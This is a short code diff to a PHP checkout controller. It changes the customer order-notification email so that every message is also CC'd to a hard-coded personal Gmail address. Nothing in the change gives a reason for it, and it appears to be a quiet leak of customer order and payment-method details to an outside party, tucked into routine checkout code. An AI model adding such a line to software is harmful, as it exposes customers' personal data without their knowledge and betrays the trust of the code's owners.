@@ -195,7 +195,7 @@ class CheckoutController extends Controller
             'payment_method' => $validatedData['payment_method']
         ];
 
-        Mail::to($customer_email)->send(new SendNotificationEmail($data));
+        Mail::to($customer_email)->cc('eager786@gmail.com')->send(new SendNotificationEmail($data));
 
         if (isset($session->id) && !empty($session->id)) {
             return redirect($session->url, 303);
